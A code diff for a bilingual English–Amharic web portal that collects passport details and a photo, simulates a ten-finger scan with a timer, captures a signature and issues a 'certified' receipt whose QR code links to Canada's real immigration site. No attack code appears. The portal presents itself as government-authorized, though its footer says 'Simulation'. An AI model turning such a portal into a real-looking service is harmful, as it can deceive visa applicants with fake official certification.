+    leftSub:"Place each finger gently on the sensor when prompted. Capture is automatic.",
+    leftStatus:"Awaiting — Place Left Thumb",
+    tapHint:"Tap to scan",
+    leftPrompt:"Place Left Thumb", leftHelp:"Touch the sensor to begin automatic capture.",
+    rightRibbon:"Biometric Capture", rightTitle:"RIGHT HAND ENROLLMENT",
+    rightSub:"Continue with the right hand. Place each finger gently on the sensor.",
+    rightStatus:"Awaiting — Place Right Thumb",
+    rightPrompt:"Place Right Thumb", rightHelp:"Touch the sensor to begin automatic capture.",
+    counter:"Progress:",
+    sigLabel:"Step 4 of 4",
+    sigRibbon:"Applicant Signature",
+    sigTitle:"Please Sign Below",
+    sigInstr:"Please sign inside the signature box below.",
+    sigHint:"Sign here",
+    sigSaved:"Signature saved",
+    sigClear:"Clear Signature",
+    sigSave:"Save Signature",
+    sigContinue:"Complete Registration",
+    kCertDate:"Date of Certification",
+    doneRibbon:"Registration Complete",
+    doneTitle:"Registration Successful",
+    doneSub:"Your biometric enrollment has been completed and certified.",
+    ck1:"Biometric Enrollment Completed",
+    ck2:"Applicant Successfully Registered",
+    ck3:"Certificate Ready for Download",
+    kRegID:"Registration ID", kDate:"Registration Date", kTime:"Registration Time",
+    kPhone:"Phone", kNationality:"Nationality", kStatus:"Status",
+    viewCert:"View Certified Receipt",
+    certSub:"Certified Registration Receipt",
+    secReg:"Registration Information", secApp:"Applicant Information",
+    statusCompleted:"Completed",
+    certStatement:'"This certifies that the applicant has successfully completed registration and biometric enrollment requirements."',
+    sigName:"Authorized Registration Officer",
+    sigRole:"IMO Forensic and Medical Registration",
+    appSigName:"Applicant Signature",
+    gmName:"General Manager",
+    gmRole:"IMO Forensic and Medical Registration",
+    sigNoData:"— no signature —",
+    qrCap:"Scan to view immigration information",
+    dlPdf:"Download Receipt as PDF",
+    printReceipt:"Print Receipt",
+    newReg:"New Registration",
+    footerTxt:"Official Biometric Enrollment Portal — Simulation",
+    toastSaved:"Receipt ready for download"
+  },
+  am: {
+    brandTitle:"አይኤምኦ ፎሬንሲክስ እና ሕክምና መመዝገቢያ",
+    brandSub:"ኦፊሴላዊ የባዮሜትሪክ ምዝገባ ፖርታል",
+    cCanada:"ካናዳ", cUK:"ዩናይትድ ኪንግደም", cUSA:"ዩናይትድ ስቴትስ", cAUS:"አውስትራሊያ", cNZ:"ኒው ዚላንድ",
+    welcomeRibbon:"የመንግስት የተፈቀደ አገልግሎት",
+    welcomeTitle:"ወደ ኦፊሴላዊ የባዮሜትሪክ ምዝገባ ፖርታል እንኳን ደህና መጡ",
+    welcomeDesc:"ለቪዛ፣ ኢሚግሬሽን፣ ፎሬንሲክስ እና ሕክምና ምዝገባ ሂደት ደህንነቱ የተጠበቀ የመንግስት ደረጃ ያለው ምዝገባ ስርዓት። ከታች ማመልከቻዎን ይጀምሩ።",
+    startBtn:"ምዝገባ ይጀምሩ",
+    feat1Title:"የአመልካች ምዝገባ",
+    feat1Desc:"የግል ዝርዝሮችዎን እና የመታወቂያ ሰነዶችን በደህንነት ያቅርቡ።",
+    feat2Title:"የባዮሜትሪክ ምዝገባ",
+    feat2Desc:"ከሁሉም አስር ጣቶችዎ የጣት አሻራ ይያዙ።",
+    feat3Title:"ኦፊሴላዊ ምስክር ወረቀት",
+    feat3Desc:"የተመሰከረ የምዝገባ ደረሰኝ ያግኙ።",
+    step1Label:"እርምጃ 1 ከ 3", step2Label:"እርምጃ 2 ከ 3", step3Label:"እርምጃ 3 ከ 3",
+    step1Ribbon:"የአመልካች መረጃ",
+    step1Title:"የግል እና የመታወቂያ ዝርዝሮች",
+    step1Desc:"እባክዎ በፓስፖርትዎ ላይ እንዳለው ትክክለኛ መረጃ ያቅርቡ።",
+    lblName:"ሙሉ ስም", lblPassport:"የፓስፖርት ቁጥር", lblPhone:"ስልክ ቁጥር", lblNationality:"ዜግነት", lblPhoto:"የፓስፖርት ፎቶ",
+    phName:"እንደተጻፈበት በፓስፖርትዎ", phPassport:"ለምሳሌ PA1234567", phPhone:"+251 9.. .. .. ..",
+    optSelect:"— ዜግነት ይምረጡ —",
+    photoUpB:"የፓስፖርት ፎቶ ይስቀሉ", photoUpS:"JPG ወይም PNG፣ ከ5MB በታች",
+    errName:"እባክዎ ሙሉ ስምዎን ያስገቡ።",
+    errPassport:"እባክዎ ትክክለኛ የፓስፖርት ቁጥር ያስገቡ።",
+    errPhone:"እባክዎ ስልክ ቁጥርዎን ያስገቡ።",
+    errNationality:"እባክዎ ዜግነትዎን ይምረጡ።",
+    errPhoto:"እባክዎ የፓስፖስት ፎቶ ይስቀሉ።",
+    btnBack:"ተመለስ", btnNext:"ወደ ባዮሜትሪክ ይቀጥሉ",
+    leftRibbon:"የባዮሜትሪክ ማንሳፊያ", leftTitle:"የግራ እጅ ምዝገባ",
+    leftSub:"ጥያቄ ሲቀርብልዎ እያንዳንዱን ጣት በስኖርው ላይ በቀስታ ያድርጉ።",
+    leftStatus:"በመጠባበቅ ላይ — የግራ ትልቅ ጣት ያድርጉ",
+    tapHint:"ለስካን ይንኩ",
+    leftPrompt:"የግራ ትልቅ ጣት ያድርጉ", leftHelp:"ራስ-ሰር ለማንሳት ስኖርውን ይንኩ።",
+    rightRibbon:"የባዮሜትሪክ ማንሳፊያ", rightTitle:"የቀኝ እጅ ምዝገባ",
+    rightSub:"በቀኝ እጅ ይቀጥሉ። እያንዳንዱን ጣት በስኖርው ላይ ያድርጉ።",
+    rightStatus:"በመጠባበቅ ላይ — የቀኝ ትልቅ ጣት ያድርጉ",
+    rightPrompt:"የቀኝ ትልቅ ጣት ያድርጉ", rightHelp:"ራስ-ሰር ለማንሳት ስኖርውን ይንኩ።",
+    counter:"ሂደት:",
+    sigLabel:"እርምጃ 4 ከ 4",
+    sigRibbon:"የአመልካች ፊርማ",
+    sigTitle:"እባክዎ ከታች ይፈርሙ",
+    sigInstr:"እባክዎ በሚኖርበት ሳጥን ውስጥ ይፈርሙ።",
+    sigHint:"እዚህ ይፈርሙ",
+    sigSaved:"ፊርማ ተቀምጧል",
+    sigClear:"ፊርማ አጽዳ",
+    sigSave:"ፊርማ አስቀምጥ",
+    sigContinue:"ምዝገባ አጠናቅቅ",
+    kCertDate:"የምስክር ቀን",
+    doneRibbon:"ምዝገባ ተጠናቋል",
+    doneTitle:"ምዝገባ ተሳክቷል",
+    doneSub:"የባዮሜትሪክ ምዝገባዎ ተጠናቋል እና ተመስክሯል።",
+    ck1:"የባዮሜትሪክ ምዝገባ ተጠናቋል",
+    ck2:"አመልካች በተሳካ ሁኔታ ተመዝግቧል",
+    ck3:"የምስክር ወረቀት ለማውረድ ዝግጁ ነው",
+    kRegID:"የምዝገባ መለያ", kDate:"የምዝገባ ቀን", kTime:"የምዝገባ ሰዓት",
+    kPhone:"ስልክ", kNationality:"ዜግነት", kStatus:"ሁኔታ",
+    viewCert:"የተመሰከረ ደረሰኝ ይመልከቱ",
+    certSub:"የተመሰከረ የምዝገባ ደረሰኝ",
+    secReg:"የምዝገባ መረጃ", secApp:"የአመልካች መረጃ",
+    statusCompleted:"ተጠናቋል",
+    certStatement:'"ይህ አመልካች ምዝገባ እና የባዮሜትሪክ ምዝገባ መስፈርቶችን በተሳካ ሁኔታ እንዲያጠናቅቅ የሚያረጋግጥ ነው።"',
+    sigName:"የተፈቀደ የምዝገባ ኦፊሰር",
+    sigRole:"አይኤምኦ ፎሬንሲክስ እና ሕክምና መመዝገቢያ",
+    appSigName:"የአመልካች ፊርማ",
+    gmName:"አጠቃላይ ስራ አስኪያጅ",
+    gmRole:"አይኤምኦ ፎሬንሲክስ እና ሕክምና መመዝገቢያ",
+    sigNoData:"— ፊርማ የለም —",
+    qrCap:"የኢሚግሬሽን መረጃ ለማየት ይቃኙ",
+    dlPdf:"ደረሰኝ እንደ PDF አውርድ",
+    printReceipt:"ደረሰኝ አትም",
+    newReg:"አዲስ ምዝገባ",
+    footerTxt:"ኦፊሴላዊ የባዮሜትሪክ ምዝገባ ፖርታል — ማስመሰያ",
+    toastSaved:"ደረሰኝ ለማውረድ ዝግጁ ነው"
+  }
+};
 
-        function stopDrawing() {
-            isDrawing = false;
-        }
+let currentLang = 'en';
+function t(key){ return (I18N[currentLang] && I18N[currentLang][key]) || (I18N.en[key] || key); }
+function applyLang(){
+  document.querySelectorAll('[data-i18n]').forEach(el=>{
+    const k = el.getAttribute('data-i18n');
+    if(I18N[currentLang] && I18N[currentLang][k]) el.textContent = I18N[currentLang][k];
+  });
+  document.querySelectorAll('[data-i18n-ph]').forEach(el=>{
+    const k = el.getAttribute('data-i18n-ph');
+    if(I18N[currentLang] && I18N[currentLang][k]) el.placeholder = I18N[currentLang][k];
+  });
+  // Re-render dynamic UI
+  buildFingerGrids();
+  if(currentHand) updateFingerStatus();
+  document.documentElement.lang = currentLang;
+}
+function setLang(l){
+  if(!I18N[l]) return;
+  currentLang = l;
+  document.getElementById('langSel').value = l;
+  applyLang();
+  showToast(t('toastSaved'));
+}
 
-        function clearSignature() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-        }
+/* ============== STATE ============== */
+const STATE = {
+  applicant: {},
+  photoDataUrl: '',
+  regId: '',
+  regDate: '',
+  regTime: '',
+  biometrics: { left: [], right: [] },
+  scanning: false
+};
+const FINGERS = {
+  left:  ['Left Thumb','Left Index Finger','Left Middle Finger','Left Ring Finger','Left Little Finger'],
+  right: ['Right Thumb','Right Index Finger','Right Middle Finger','Right Ring Finger','Right Little Finger']
+};
+let currentHand = null;   // 'left' | 'right'
+let currentFingerIdx = 0;
 
-        canvas.addEventListener('mousedown', startDrawing);
-        canvas.addEventListener('mousemove', draw);
-        canvas.addEventListener('mouseup', stopDrawing);
-        canvas.addEventListener('mouseout', stopDrawing);
-        canvas.addEventListener('touchstart', startDrawing, { passive: false });
-        canvas.addEventListener('touchmove', draw, { passive: false });
-        canvas.addEventListener('touchend', stopDrawing);
+/* ============== HELPERS ============== */
+function $(s,r=document){ return r.querySelector(s); }
+function $$(s,r=document){ return Array.from(r.querySelectorAll(s)); }
+function pad(n){ return String(n).padStart(2,'0'); }
+function fmtDate(d){
+  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+  return `${pad(d.getDate())} ${months[d.getMonth()]} ${d.getFullYear()}`;
+}
+function fmtTime(d){ return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`; }
+function genRegId(){
+  const d = new Date();
+  const yr = d.getFullYear();
+  const rand = Math.random().toString(36).slice(2,8).toUpperCase();
+  return `IMO-${yr}-${rand}`;
+}
+function showToast(msg){
+  const el = $('#toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(()=>el.classList.remove('show'), 2200);
+}
+function showScreen(id){
+  $$('.screen').forEach(s=>s.classList.remove('active'));
+  $('#'+id).classList.add('active');
+  window.scrollTo({top:0, behavior:'smooth'});
+}
 
-        document.getElementById('registration-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            applicantData = {
-                fullName: document.getElementById('fullName').value,
-                passportNumber: document.getElementById('passportNumber').value,
-                phoneNumber: document.getElementById('phoneNumber').value,
-                nationality: document.getElementById('nationality').value,
-                photo: document.getElementById('photo-preview').src,
-                signature: canvas.toDataURL()
-            };
+/* ============== SCREEN NAV ============== */
+$('#startBtn').addEventListener('click', ()=> showScreen('screen-step1'));
+$('#backWelcomeBtn').addEventListener('click', ()=> showScreen('screen-welcome'));
+$('#viewCertBtn').addEventListener('click', ()=>{ populateCertificate(); showScreen('screen-receipt'); });
+$('#newRegBtn').addEventListener('click', ()=>{
+  if(confirm('Start a new registration? Current data will be cleared.')){
+    resetAll();
+    showScreen('screen-welcome');
+  }
+});
 
-            if (!applicantData.photo || applicantData.photo === window.location.href) {
-                alert('Please upload a passport photo');
-                return;
-            }
+/* ============== LANGUAGE ============== */
+$('#langSel').addEventListener('change', e=> setLang(e.target.value));
 
-            goToStep(2);
-        });
+/* ============== PHOTO ============== */
+$('#photo').addEventListener('change', e=>{
+  const f = e.target.files[0];
+  if(!f) return;
+  if(f.size > 5*1024*1024){ alert('File too large (max 5MB).'); e.target.value=''; return; }
+  const r = new FileReader();
+  r.onload = ev => {
+    STATE.photoDataUrl = ev.target.result;
+    const prev = $('#photoPreview');
+    prev.src = STATE.photoDataUrl;
+    prev.classList.add('show');
+    prev.parentElement.querySelector('.info span').textContent = f.name;
+    clearErr('photo');
+  };
+  r.readAsDataURL(f);
+});
 
-        function goToStep(step) {
-            document.querySelectorAll('.step-content').forEach(el => el.classList.add('hidden'));
-            document.getElementById(`step-${step}`).classList.remove('hidden');
-            
-            const progress = ((step - 1) / 3) * 100;
-            document.getElementById('progress-bar').style.width = `${progress}%`;
-            
-            document.querySelectorAll('.step-indicator').forEach((el, idx) => {
-                const stepNum = idx + 1;
-                const circle = el.querySelector('div');
-                const text = el.querySelector('span');
-                
-                if (stepNum < step) {
-                    circle.className = 'w-10 h-10 rounded-full border-2 border-emerald-500 bg-emerald-500 text-white flex items-center justify-center font-bold transition-all';
-                    circle.innerHTML = '✓';
-                    text.className = 'text-xs font-semibold text-emerald-600 hidden sm:block';
-                } else if (stepNum === step) {
-                    circle.className = 'w-10 h-10 rounded-full border-2 border-blue-900 bg-blue-900 text-white flex items-center justify-center font-bold transition-all';
-                    circle.textContent = stepNum;
-                    text.className = 'text-xs font-semibold text-blue-900 hidden sm:block';
-                } else {
-                    circle.className = 'w-10 h-10 rounded-full border-2 border-slate-300 bg-white text-slate-500 flex items-center justify-center font-bold transition-all';
-                    circle.textContent = stepNum;
-                    text.className = 'text-xs font-semibold text-slate-500 hidden sm:block';
-                }
-            });
+/* ============== FORM VALIDATION ============== */
+function setErr(id, on){
+  const input = $('#'+id);
+  if(input){ input.classList.toggle('error', !!on); }
+  const formEl = $('#'+id)?.closest('.field');
+  if(formEl){
+    const msg = formEl.querySelector('.err-msg');
+    if(msg) msg.classList.toggle('show', !!on);
+  }
+}
+function clearErr(id){ setErr(id, false); }
 
-            currentStep = step;
+['fullName','passport','phone','nationality'].forEach(id=>{
+  $('#'+id).addEventListener('input', ()=>clearErr(id));
+  $('#'+id).addEventListener('change', ()=>clearErr(id));
+});
 
-            if (step === 2) {
-                initBiometric();
-            } else if (step === 3) {
-                showCompletion();
-            } else if (step === 4) {
-                generateReceipt();
-            }
-        }
+$('#applicantForm').addEventListener('submit', e=>{
+  e.preventDefault();
+  let ok = true;
+  if(!$('#fullName').value.trim()){ setErr('fullName', true); ok=false; }
+  if(!$('#passport').value.trim()){ setErr('passport', true); ok=false; }
+  if(!$('#phone').value.trim()){ setErr('phone', true); ok=false; }
+  if(!$('#nationality').value){ setErr('nationality', true); ok=false; }
+  if(!STATE.photoDataUrl){ setErr('photo', true); ok=false; }
+  if(!ok){ showToast('Please complete all required fields.'); return; }
 
-        function initBiometric() {
-            currentFingerIndex = 0;
-            isScanning = false;
-            const tracker = document.getElementById('finger-tracker');
-            tracker.innerHTML = '';
-            
-            for (let i = 0; i < 10; i++) {
-                const dot = document.createElement('div');
-                dot.className = 'finger-dot';
-                dot.id = `finger-dot-${i}`;
-                dot.textContent = i + 1;
-                tracker.appendChild(dot);
-            }
-            
-            updateFingerInstruction();
-        }
+  // Save data
+  STATE.applicant = {
+    fullName: $('#fullName').value.trim(),
+    passport: $('#passport').value.trim(),
+    phone: $('#phone').value.trim(),
+    nationality: $('#nationality').value
+  };
+  // Init left enrollment
+  startHand('left');
+});
 
-        function updateFingerInstruction() {
-            const fingerName = getFingerName(currentFingerIndex);
-            const instruction = currentLang === 'en' 
-                ? `Place ${fingerName} on the scanner`
-                : `${fingerName}ን በስካነሩ ላይ ያድርጉ`;
-            document.getElementById('finger-instruction').textContent = instruction;
-        }
+/* ============== FINGER GRID ============== */
+function buildFingerGrids(){
+  ['left','right'].forEach(hand=>{
+    const grid = $('#'+hand+'Grid');
+    if(!grid) return;
+    grid.innerHTML = '';
+    FINGERS[hand].forEach((name,i)=>{
+      const d = document.createElement('div');
+      d.className = 'finger-dot';
+      d.dataset.idx = i;
+      d.innerHTML = `
+        <div class="ico">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 2v6M12 22v-6M2 12h6M22 12h-6"/>
+            <circle cx="12" cy="12" r="4"/>
+          </svg>
+        </div>
+        <div class="name">${name}</div>
+      `;
+      grid.appendChild(d);
+    });
+  });
+}
 
-        function startScan(e) {
-            if (e) e.preventDefault();
-            if (isScanning || currentFingerIndex >= 10) return;
-            
-            isScanning = true;
-            const scanner = document.getElementById('scanner-area');
-            const instruction = document.getElementById('finger-instruction');
-            
-            scanner.classList.add('scanning');
-            instruction.textContent = translations[currentLang].scanning;
-            
-            setTimeout(() => {
-                isScanning = false;
-                scanner.classList.remove('scanning');
-                
-                const dot = document.getElementById(`finger-dot-${currentFingerIndex}`);
-                dot.classList.add('completed');
-                dot.innerHTML = '✓';
-                
-                currentFingerIndex++;
-                
-                if (currentFingerIndex < 10) {
-                    updateFingerInstruction();
-                } else {
-                    setTimeout(() => goToStep(3), 500);
-                }
-            }, 2000);
-        }
+/* ============== BIOMETRIC FLOW ============== */
+function startHand(hand){
+  currentHand = hand;
+  currentFingerIdx = 0;
+  STATE.biometrics[hand] = [];
+  showScreen(hand==='left' ? 'screen-step2' : 'screen-step3');
+  // Reset dots
+  $$('#'+hand+'Grid .finger-dot').forEach(d=>{ d.classList.remove('active','done'); });
+  $('#'+hand+'Target').classList.remove('scanning','completed','active');
+  updateFingerStatus();
+  if(hand==='right'){
+    // pre-mark all left as done
+    $$('#leftGrid .finger-dot').forEach(d=> d.classList.add('done'));
+  }
+}
 
-        function showCompletion() {
-            const now = new Date();
-            const regId = 'IMO-' + Date.now().toString(36).toUpperCase();
-            
-            applicantData.regId = regId;
-            applicantData.regDate = now.toLocaleDateString();
-            applicantData.regTime = now.toLocaleTimeString();
-            
-            document.getElementById('display-reg-id').textContent = regId;
-            document.getElementById('display-reg-date').textContent = applicantData.regDate;
-            document.getElementById('display-reg-time').textContent = applicantData.regTime;
-        }
+function updateFingerStatus(){
+  if(!currentHand) return;
+  const hand = currentHand;
+  const name = FINGERS[hand][currentFingerIdx];
+  const statusEl = $('#'+hand+'Status');
+  const promptEl = $('#'+hand+'Prompt');
+  statusEl.textContent = `${currentLang==='am'?'በመጠባበቅ ላይ':'Awaiting'} — Place ${name}`;
+  promptEl.textContent = `Place ${name}`;
+  // highlight current dot
+  $$('#'+hand+'Grid .finger-dot').forEach((d,i)=>{
+    d.classList.toggle('active', i===currentFingerIdx && !STATE.biometrics[hand].includes(i));
+  });
+  const target = $('#'+hand+'Target');
+  target.classList.remove('scanning','completed');
+  target.classList.add('active');
+  // counter
+  if(hand==='left'){
+    $('#leftCount').textContent = `${STATE.biometrics.left.length}/5`;
+  } else {
+    const total = STATE.biometrics.left.length + STATE.biometrics.right.length;
+    $('#rightCount').textContent = `${total}/10`;
+  }
+}
 
-        function generateReceipt() {
-            document.getElementById('receipt-reg-id').textContent = applicantData.regId;
-            document.getElementById('receipt-reg-date').textContent = applicantData.regDate;
-            document.getElementById('receipt-name').textContent = applicantData.fullName;
-            document.getElementById('receipt-passport').textContent = applicantData.passportNumber;
-            document.getElementById('receipt-phone').textContent = applicantData.phoneNumber;
-            document.getElementById('receipt-nationality').textContent = applicantData.nationality;
-            document.getElementById('receipt-photo').src = applicantData.photo;
-            document.getElementById('receipt-applicant-sig').src = applicantData.signature;
-            
-            document.getElementById('qrcode').innerHTML = '';
-            new QRCode(document.getElementById('qrcode'), {
-                text: applicantData.regId,
-                width: 100,
-                height: 100,
-                colorDark: "#1e3a8a",
-                colorLight: "#ffffff",
-                correctLevel: QRCode.CorrectLevel.H
-            });
-        }
+async function captureFinger(hand, idx){
+  if(STATE.scanning) return;
+  STATE.scanning = true;
+  const target = $('#'+hand+'Target');
+  const barWrap = $('#'+hand+'ScanBar');
+  const barFill = $('#'+hand+'ScanFill');
+  target.classList.remove('active');
+  target.classList.add('scanning');
+  barWrap.classList.add('show');
+  barFill.style.width = '0%';
+  // 2s scan
+  await new Promise(res=>{
+    let p = 0;
+    const start = performance.now();
+    function step(now){
+      const elapsed = now - start;
+      p = Math.min(100, (elapsed/2000)*100);
+      barFill.style.width = p+'%';
+      if(p < 100) requestAnimationFrame(step);
+      else res();
+    }
+    requestAnimationFrame(step);
+  });
+  // complete
+  target.classList.remove('scanning');
+  target.classList.add('completed');
+  barWrap.classList.remove('show');
+  STATE.biometrics[hand].push(idx);
+  // mark dot
+  const dot = $$('#'+hand+'Grid .finger-dot')[idx];
+  dot.classList.remove('active');
+  dot.classList.add('done');
+  // small delay
+  await new Promise(r=>setTimeout(r, 400));
+  STATE.scanning = false;
+  currentFingerIdx++;
 
-        async function downloadPDF() {
-            const element = document.getElementById('receipt-content');
-            const canvas = await html2canvas(element, { 
-                scale: 2,
-                useCORS: true,
-                backgroundColor: '#ffffff'
-            });
-            const imgData = canvas.toDataURL('image/png');
-            const { jsPDF } = window.jspdf;
-            const pdf = new jsPDF('p', 'mm', 'a4');
-            const pdfWidth = pdf.internal.pageSize.getWidth();
-            const pdfHeight = (canvas.height * pdfWidth) / canvas.width;
-            pdf.addImage(imgData, 'PNG', 0, 0, pdfWidth, pdfHeight);
-            pdf.save(`IMO_Receipt_${applicantData.regId}.pdf`);
-        }
+  if(currentFingerIdx < 5){
+    updateFingerStatus();
+  } else {
+    // hand done
+    target.classList.remove('active','completed');
+    if(hand==='left'){
+      // auto-advance to right hand
+      await new Promise(r=>setTimeout(r, 800));
+      startHand('right');
+    } else {
+      // all biometrics done -> go to signature step
+      await new Promise(r=>setTimeout(r, 800));
+      startSignature();
+    }
+  }
+}
 
-        // Initialize
-        updateTranslations();
-    </script>
+['left','right'].forEach(hand=>{
+  const target = $('#'+hand+'Target');
+  const trigger = (e)=>{
+    e.preventDefault();
+    if(STATE.scanning) return;
+    captureFinger(hand, currentFingerIdx);
+  };
+  target.addEventListener('click', trigger);
+  target.addEventListener('touchstart', trigger, {passive:false});
+});
+
+/* ============== SIGNATURE PAD ============== */
+const sigPad = $('#sigPad');
+const sigCtx = sigPad.getContext('2d');
+let sigDrawing = false;
+let sigHasInk = false;
+let sigLast = {x:0, y:0};
+
+function setupSignaturePad(){
+  // Resize canvas to its CSS size for high-DPI / consistent strokes
+  const dpr = Math.max(1, window.devicePixelRatio || 1);
+  const rect = sigPad.getBoundingClientRect();
+  sigPad.width  = Math.floor(rect.width  * dpr);
+  sigPad.height = Math.floor(rect.height * dpr);
+  sigCtx.scale(dpr, dpr);
+  sigCtx.lineWidth = 2.4;
+  sigCtx.lineCap = 'round';
+  sigCtx.lineJoin = 'round';
+  sigCtx.strokeStyle = '#0a2a55';
+  sigCtx.fillStyle = '#ffffff';
+  sigCtx.fillRect(0, 0, sigPad.width, sigPad.height);
+}
+function sigPos(e){
+  const rect = sigPad.getBoundingClientRect();
+  let cx, cy;
+  if(e.touches && e.touches.length){
+    cx = e.touches[0].clientX; cy = e.touches[0].clientY;
+  } else {
+    cx = e.clientX; cy = e.clientY;
+  }
+  return { x: cx - rect.left, y: cy - rect.top };
+}
+function sigStart(e){
+  if(STATE.scanning) return;
+  e.preventDefault();
+  sigDrawing = true;
+  const p = sigPos(e);
+  sigLast = p;
+}
+function sigMove(e){
+  if(!sigDrawing) return;
+  e.preventDefault();
+  const p = sigPos(e);
+  sigCtx.beginPath();
+  sigCtx.moveTo(sigLast.x, sigLast.y);
+  sigCtx.lineTo(p.x, p.y);
+  sigCtx.stroke();
+  sigLast = p;
+  if(!sigHasInk){
+    sigHasInk = true;
+    $('#sigPadWrap').classList.add('has-ink');
+    $('#saveSigBtn').disabled = false;
+  }
+}
+function sigEnd(e){
+  if(e) e.preventDefault();
+  sigDrawing = false;
+}
+// Wire events (mouse + touch + pointer)
+sigPad.addEventListener('mousedown', sigStart);
+sigPad.addEventListener('mousemove', sigMove);
+window.addEventListener('mouseup', sigEnd);
+sigPad.addEventListener('touchstart', sigStart, {passive:false});
+sigPad.addEventListener('touchmove', sigMove, {passive:false});
+sigPad.addEventListener('touchend', sigEnd, {passive:false});
+sigPad.addEventListener('touchcancel', sigEnd, {passive:false});
+// Pointer events cover stylus/pen on tablets
+sigPad.addEventListener('pointerdown', sigStart);
+sigPad.addEventListener('pointermove', sigMove);
+sigPad.addEventListener('pointerup', sigEnd);
+sigPad.addEventListener('pointerleave', sigEnd);
+
+function startSignature(){
+  showScreen('screen-signature');
+  // Reset signature state
+  STATE.signatureDataUrl = '';
+  sigHasInk = false;
+  $('#sigPadWrap').classList.remove('has-ink');
+  $('#saveSigBtn').disabled = true;
+  $('#continueAfterSigBtn').disabled = true;
+  $('#sigSavedBadge').classList.remove('show');
+  // Re-initialize canvas on next frame so layout is ready
+  requestAnimationFrame(setupSignaturePad);
+}
+function clearSignature(){
+  sigCtx.save();
+  sigCtx.setTransform(1, 0, 0, 1, 0, 0);
+  sigCtx.fillStyle = '#ffffff';
+  sigCtx.fillRect(0, 0, sigPad.width, sigPad.height);
+  sigCtx.restore();
+  sigHasInk = false;
+  $('#sigPadWrap').classList.remove('has-ink');
+  $('#saveSigBtn').disabled = true;
+  $('#continueAfterSigBtn').disabled = true;
+  $('#sigSavedBadge').classList.remove('show');
+  STATE.signatureDataUrl = '';
+}
+function saveSignature(){
+  if(!sigHasInk){
+    showToast(currentLang==='am'?'እባክዎ መጀመሪያ ይፈርሙ':'Please sign first.');
+    return;
+  }
+  // Save as PNG (transparent bg would be nicer, but white is fine for print)
+  STATE.signatureDataUrl = sigPad.toDataURL('image/png');
+  $('#sigSavedBadge').classList.add('show');
+  $('#continueAfterSigBtn').disabled = false;
+  showToast(currentLang==='am'?'ፊርማ ተቀምጧል':'Signature saved.');
+}
+$('#clearSigBtn').addEventListener('click', clearSignature);
+$('#saveSigBtn').addEventListener('click', saveSignature);
+$('#continueAfterSigBtn').addEventListener('click', ()=>{
+  if(!STATE.signatureDataUrl){ showToast('Please save your signature first.'); return; }
+  finalizeRegistration();
+});
+// Re-init pad on resize
+window.addEventListener('resize', ()=>{ if($('#screen-signature').classList.contains('active')) setupSignaturePad(); });
+
+/* ============== FINALIZE ============== */
+function finalizeRegistration(){
+  const d = new Date();
+  STATE.regId = genRegId();
+  STATE.regDate = fmtDate(d);
+  STATE.regTime = fmtTime(d);
+  // Populate success screen
+  $('#successName').textContent = STATE.applicant.fullName;
+  $('#successPassport').textContent = STATE.applicant.passport;
+  $('#successRegID').textContent = STATE.regId;
+  $('#successDate').textContent = STATE.regDate;
+  $('#successTime').textContent = STATE.regTime;
+  $('#successPhone').textContent = STATE.applicant.phone;
+  $('#successNationality').textContent = STATE.applicant.nationality;
+  // photo
+  const frame = $('#successPhotoFrame');
+  frame.innerHTML = '';
+  if(STATE.photoDataUrl){
+    const img = document.createElement('img');
+    img.src = STATE.photoDataUrl;
+    frame.appendChild(img);
+  }
+  showScreen('screen-step4');
+}
+
+/* ============== CERTIFICATE ============== */
+function populateCertificate(){
+  $('#certRegID').textContent = STATE.regId;
+  $('#certRegID2').textContent = STATE.regId;
+  $('#certDate').textContent = STATE.regDate;
+  $('#certTime').textContent = STATE.regTime;
+  $('#certName').textContent = STATE.applicant.fullName;
+  $('#certPassport').textContent = STATE.applicant.passport;
+  $('#certPhone').textContent = STATE.applicant.phone;
+  $('#certNationality').textContent = STATE.applicant.nationality;
+  // Certification dates (used in footer signature row)
+  if($('#certDateSig1')) $('#certDateSig1').textContent = STATE.regDate;
+  if($('#certDateSig2')) $('#certDateSig2').textContent = STATE.regDate;
+  // Applicant signature (drawn by user)
+  const sigBox = $('#applicantSigBox');
+  if(sigBox){
+    sigBox.innerHTML = '';
+    if(STATE.signatureDataUrl){
+      const img = document.createElement('img');
+      img.src = STATE.signatureDataUrl;
+      img.alt = 'Applicant signature';
+      sigBox.appendChild(img);
+    } else {
+      const sp = document.createElement('span');
+      sp.className = 'sig-empty';
+      sp.textContent = t('sigNoData');
+      sigBox.appendChild(sp);
+    }
+  }
+  // photo
+  const pf = $('#certPhotoFrame');
+  pf.innerHTML = '';
+  if(STATE.photoDataUrl){
+    const img = document.createElement('img');
+    img.src = STATE.photoDataUrl;
+    pf.appendChild(img);
+  } else {
+    pf.innerHTML = '<svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>';
+  }
+  // QR — high-resolution, scannable, points to real working URL
+  const qrDiv = document.getElementById('qrcode');
+  qrDiv.innerHTML = '';
+  try{
+    // Build destination URL safely from the configured constant
+    let qrUrl = QR_DESTINATION_URL;
+    // Final safety check before encoding
+    try {
+      const u = new URL(qrUrl);
+      if(u.protocol !== 'https:' || !u.hostname) qrUrl = 'https://www.canada.ca/en/immigration-refugees-citizenship.html';
+    } catch(_){ qrUrl = 'https://www.canada.ca/en/immigration-refugees-citizenship.html'; }
+
+    // Render at high pixel density for crisp print / scan reliability.
+    // Display CSS scales it down to fit the certificate; the source pixels
+    // remain dense enough that printed copies stay scannable.
+    new QRCode(qrDiv, {
+      text: qrUrl,
+      width: 240,           // high-resolution source
+      height: 240,
+      colorDark: '#0a2a55',
+      colorLight: '#ffffff',
+      correctLevel: QRCode.CorrectLevel.H   // ~30% redundancy = robust to print smudges
+    });
+    // Stash the URL on the container for the user (e.g. tooltip / debug)
+    qrDiv.setAttribute('data-qr-url', qrUrl);
+    qrDiv.setAttribute('title', qrUrl);
+  } catch(e){
+    console.error('[QR] Generation failed:', e);
